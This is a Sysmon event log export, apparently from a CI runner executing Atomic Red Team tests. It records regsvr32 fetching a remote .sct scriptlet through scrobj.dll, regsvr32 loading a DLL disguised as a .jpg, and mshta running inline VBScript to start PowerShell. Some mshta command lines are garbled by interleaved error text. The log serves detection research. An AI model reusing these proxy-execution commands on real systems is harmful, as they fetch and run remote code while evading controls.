"12/17/2025 8:06:13 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:06:13.685
ProcessGuid: {f995aebf-6475-6942-5c07-000000000e00}
ProcessId: 10020
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:04:27 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 08:04:27.805
ProcessGuid: {f995aebf-552f-6942-d500-000000000e00}
ProcessId: 7572
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:14 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:14.090
ProcessGuid: {f995aebf-63fe-6942-5307-000000000e00}
ProcessId: 6924
Image: C:\Program Files (x86)\Google\GoogleUpdater\143.0.7482.0\updater.exe
ImageLoaded: C:\Windows\SysWOW64\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=11B9FF7634BD6D54CD72A7C679682DABB30F6F0BC0BA5BAE2D3EE2CE3CEA73D2
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:14 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:04:11.965
ProcessGuid: {f995aebf-63fb-6942-4107-000000000e00}
ProcessId: 9928
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\regsvr32.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:14 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:14.062
ProcessGuid: {f995aebf-63fe-6942-5207-000000000e00}
ProcessId: 1576
Image: C:\Program Files (x86)\Google\GoogleUpdater\143.0.7482.0\updater.exe
ImageLoaded: C:\Windows\SysWOW64\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=11B9FF7634BD6D54CD72A7C679682DABB30F6F0BC0BA5BAE2D3EE2CE3CEA73D2
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:13.673
ProcessGuid: {f995aebf-63fd-6942-4f07-000000000e00}
ProcessId: 1932
Image: C:\Windows\SysWOW64\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine:   /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=097108607177A9282D10CD4808221B171B729AFBADB1EBA3C99139348AC8295F
ParentProcessGuid: {f995aebf-63fd-6942-4e07-000000000e00}
ParentProcessId: 9564
ParentImage: C:\Windows\System32\regsvr32.exe
ParentCommandLine: C:\Windows\system32\regsvr32.exe  /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:13.653
ProcessGuid: {f995aebf-63fd-6942-4e07-000000000e00}
ProcessId: 9564
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-63fd-6942-4c07-000000000e00}
ParentProcessId: 1760
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:13.377
ProcessGuid: {f995aebf-63fd-6942-4a07-000000000e00}
ProcessId: 8744
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s C:\Users\RUNNER~1\AppData\Local\Temp\shell32.jpg
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-63fd-6942-4807-000000000e00}
ParentProcessId: 6128
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s %temp%\shell32.jpg
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:12.342
ProcessGuid: {f995aebf-63fc-6942-4607-000000000e00}
ProcessId: 8032
Image: C:\Windows\SysWOW64\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\syswow64\regsvr32.exe  /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=097108607177A9282D10CD4808221B171B729AFBADB1EBA3C99139348AC8295F
ParentProcessGuid: {f995aebf-63fc-6942-4407-000000000e00}
ParentProcessId: 6408
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll )
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:11.879
ProcessGuid: {f995aebf-63fb-6942-4107-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-63fb-6942-3f07-000000000e00}
ParentProcessId: 4972
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:11.537
ProcessGuid: {f995aebf-63fb-6942-3c07-000000000e00}
ProcessId: 5164
Image: C:\Windows\System32\regsvr32.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:11.483
ProcessGuid: {f995aebf-63fb-6942-3c07-000000000e00}
ProcessId: 5164
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /u /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-63fb-6942-3a07-000000000e00}
ParentProcessId: 9624
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:08.872
ProcessGuid: {f995aebf-63f8-6942-3407-000000000e00}
ProcessId: 2112
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_geqpeeuj.lqe.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:08 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:08.854
ProcessGuid: {f995aebf-63f8-6942-3407-000000000e00}
ProcessId: 2112
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_geqpeeuj.lqe.ps1
CreationUtcTime: 2025-12-17 08:04:08.854
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:08.511
ProcessGuid: {f995aebf-63f8-6942-3207-000000000e00}
ProcessId: 4136
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gqk3i0nm.bq1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:08 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:08.494
ProcessGuid: {f995aebf-63f8-6942-3207-000000000e00}
ProcessId: 4136
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gqk3i0nm.bq1.ps1
CreationUtcTime: 2025-12-17 08:04:08.494
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:08.141
ProcessGuid: {f995aebf-63f8-6942-3007-000000000e00}
ProcessId: 6984
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1ww0oksi.22o.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:08 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:08.123
ProcessGuid: {f995aebf-63f8-6942-3007-000000000e00}
ProcessId: 6984
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1ww0oksi.22o.ps1
CreationUtcTime: 2025-12-17 08:04:08.123
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:07.770
ProcessGuid: {f995aebf-63f7-6942-2e07-000000000e00}
ProcessId: 1464
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2qyiifpv.bpt.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:07 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:07.750
ProcessGuid: {f995aebf-63f7-6942-2e07-000000000e00}
ProcessId: 1464
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2qyiifpv.bpt.ps1
CreationUtcTime: 2025-12-17 08:04:07.750
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:07.397
ProcessGuid: {f995aebf-63f7-6942-2c07-000000000e00}
ProcessId: 7044
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0ijhwbty.xcr.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:07 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:07.381
ProcessGuid: {f995aebf-63f7-6942-2c07-000000000e00}
ProcessId: 7044
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0ijhwbty.xcr.ps1
CreationUtcTime: 2025-12-17 08:04:07.381
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:07.027
ProcessGuid: {f995aebf-63f6-6942-2a07-000000000e00}
ProcessId: 7036
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_npfjbsub.fca.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:07 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:07.010
ProcessGuid: {f995aebf-63f6-6942-2a07-000000000e00}
ProcessId: 7036
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_npfjbsub.fca.ps1
CreationUtcTime: 2025-12-17 08:04:07.010
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:06 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:06.549
ProcessGuid: {f995aebf-63f6-6942-2807-000000000e00}
ProcessId: 2068
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yuczcizz.mls.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:06 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:06.529
ProcessGuid: {f995aebf-63f6-6942-2807-000000000e00}
ProcessId: 2068
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yuczcizz.mls.ps1
CreationUtcTime: 2025-12-17 08:04:06.529
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:03 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:03.955
ProcessGuid: {f995aebf-5508-6942-eb03-000000000000}
ProcessId: 4
Image: System
TargetFilename: C:\Windows\System32\LogFiles\WMI\RtBackup\EtwRTTerminal-Services-LSM-ApplicationLag-4924.etl
CreationUtcTime: 2025-12-17 08:02:01.958
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:03 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:03.028
ProcessGuid: {f995aebf-5508-6942-eb03-000000000000}
ProcessId: 4
Image: System
TargetFilename: C:\Windows\System32\LogFiles\WMI\RtBackup\EtwRTTerminal-Services-LSM-ApplicationLag-4924.etl
CreationUtcTime: 2025-12-17 08:02:01.958
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:00 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:00.970
ProcessGuid: {f995aebf-63f0-6942-1b07-000000000e00}
ProcessId: 7360
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dpj1sfws.zqr.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:00 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:00.951
ProcessGuid: {f995aebf-63f0-6942-1b07-000000000e00}
ProcessId: 7360
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dpj1sfws.zqr.ps1
CreationUtcTime: 2025-12-17 08:04:00.951
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:00 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:00.306
ProcessGuid: {f995aebf-63f0-6942-1a07-000000000e00}
ProcessId: 7080
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: mshta.exe  ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").RunThe system cannot find the device specified. """"powershell.exeThe system cannot find the device specified. -nopThe system cannot find the device specified. -CommandThe system cannot find the device specified. Write-HostThe system cannot find the device specified. Hello,The system cannot find the device specified. MSHTA!;Start-SleepThe system cannot find the device specified. -SecondsNo process in the command subtree has a signal handler. """"""))</script>'""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E
ParentProcessGuid: {f995aebf-63f0-6942-1807-000000000e00}
ParentProcessId: 4832
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run4832""""powershell.exe4832-nop4832-Command4832Write-Host4832Hello,4832MSHTA!;Start-Sleep4832-Seconds%205""""""))</script>'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:59.821
ProcessGuid: {f995aebf-63ef-6942-1607-000000000e00}
ProcessId: 2812
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rdhspgya.h4u.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:59 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:59.803
ProcessGuid: {f995aebf-63ef-6942-1607-000000000e00}
ProcessId: 2812
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rdhspgya.h4u.ps1
CreationUtcTime: 2025-12-17 08:03:59.803
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:59.730
ProcessGuid: {f995aebf-63ef-6942-1607-000000000e00}
ProcessId: 2812
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:59.275
ProcessGuid: {f995aebf-63ef-6942-1407-000000000e00}
ProcessId: 3284
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jly5q4mj.m2m.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:59 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:59.259
ProcessGuid: {f995aebf-63ef-6942-1407-000000000e00}
ProcessId: 3284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jly5q4mj.m2m.ps1
CreationUtcTime: 2025-12-17 08:03:59.259
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:59.182
ProcessGuid: {f995aebf-63ef-6942-1407-000000000e00}
ProcessId: 3284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:58 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:58.729
ProcessGuid: {f995aebf-63ee-6942-1207-000000000e00}
ProcessId: 8172
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bxavmz2v.qbq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:58 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:58.713
ProcessGuid: {f995aebf-63ee-6942-1207-000000000e00}
ProcessId: 8172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bxavmz2v.qbq.ps1
CreationUtcTime: 2025-12-17 08:03:58.713
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:58 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:58.638
ProcessGuid: {f995aebf-63ee-6942-1207-000000000e00}
ProcessId: 8172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\system32\rundll32.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:58 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:58.178
ProcessGuid: {f995aebf-63ee-6942-1007-000000000e00}
ProcessId: 3476
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_phn3xikq.sxa.ps1
